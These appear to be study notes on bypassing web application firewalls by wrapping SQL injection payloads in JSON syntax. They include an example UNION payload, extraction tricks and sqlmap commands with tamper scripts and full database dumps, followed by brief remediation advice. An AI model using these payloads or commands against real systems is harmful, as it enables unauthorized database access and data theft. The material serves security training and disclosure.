### Introduction
**Web Application Firewalls (WAFs)** act as the first line of defense. Parser differences between WAFs and databases create exploitable blind spots.  

**Affected WAFs (at the time of discovery)**: AWS, Cloudflare, F5, Palo Alto, Imperva.  

**Core Idea**: Modern databases (PostgreSQL, MySQL, SQLite, etc.) support **native JSON syntax**. Many WAF parsers did not fully understand JSON-in-SQL contexts. Wrapping SQLi payloads in JSON tricks the WAF while the backend database executes the malicious SQL.

---

### 🧠 Core Concept (Memorize This)
- Standard payloads (`' OR 1=1`) → Flagged by WAF signatures.
- **JSON-wrapped payloads** → WAF fails to parse/recognize the attack → Passes through.
- Leverages **parser differential** between WAF inspection engine and database JSON support.

**Example Payload** (for bypassing):
```sql
' OR JSON_LENGTH("{}") <= 8896 UNION SELECT @@version --
```
(or similar JSON functions like `JSON_EXTRACT`, `JSON_ARRAY`, etc.)

---

### 🛠️ Step-by-Step Bypass & Exploitation

**Step 1: Identify the Vulnerability**  
Find endpoints where user input is **directly concatenated** into SQL queries.

**Step 2: Blind the WAF with JSON**  
Wrap payloads using JSON operators/functions that the database understands.

**Step 3: Overcome Backend Output Limitations**

| Limitation              | Problem                              | Fix / Technique |
|-------------------------|--------------------------------------|-----------------|
| Integers Only           | Can't extract strings                | `string_to_array` + ASCII functions |
| Random Row Order        | Data scrambled                       | `row_number()` + math (index * 1000 + ASCII) |
| Timeouts / Speed        | One char per row too slow            | **Byte-shifting** into BIGINT (pack 7-8 chars) |

**Step 4: Automate with SQLMap**

### 🚀 SQLMap Commands & Workflow (For Exam + Practical Use)

#### Basic Detection with JSON Tampering
```bash
sqlmap -u "https://target.com/vulnerable-endpoint?id=1" \
  --batch --level=5 --risk=3 \
  --tamper="between,randomcase,charencode" \   # Combine with other tampers
  --dbms=postgresql \                          # or mysql, sqlite, etc.
  --technique=BEUSTQ                           # Boolean, Error, Union, etc.
```

#### Using Custom / JSON-Specific Tamper (Historical Team82 Approach)
Team82 contributed **JSON syntax evasion tamper scripts** (one per DBMS) to SQLMap temporarily. They dynamically wrapped standard payloads with random valid JSON syntax.

**Command Example (when using their tamper)**:
```bash
sqlmap -u "https://target.com/api/users?id=1" \
  --tamper="json_sql_postgres" \     # Example name (adjust to actual script)
  --dbms=postgresql --dump
```

**Modern / Recommended Workflow**:
1. **Save Request** (Burp → Copy as curl or raw HTTP) → `request.txt`
2. Run with high verbosity:
```bash
sqlmap -r request.txt \
  --level=5 --risk=3 \
  --random-agent \
  --tamper="space2comment,between,randomcase,charencode,equaltolike" \
  --dbms=mysql \
  --dbs
```

3. **For JSON Body Injection** (common in APIs):
```bash
sqlmap -r request.txt \
  --json \
  --level=5 --risk=3 \
  --tamper=... \
  --technique=BEU
```

**To Dump Data**:
```bash
sqlmap -r request.txt --dump-all --threads=5 --batch
```

**Pro Tips for SQLMap + WAF**:
- Use `--proxy=http://127.0.0.1:8080` → Route through Burp for inspection.
- `--flush-session` → Clear old data when testing new tampers.
- `--skip-waf` → If you want to skip WAF detection heuristics.
- Combine multiple tampers with commas.

### 🛡️ Remediation (Defender Side)
- Update WAF rulesets (most vendors patched JSON support post-disclosure).
- **Primary Defense**: Use **prepared statements / parameterized queries** in the application.
- Never rely solely on WAF.
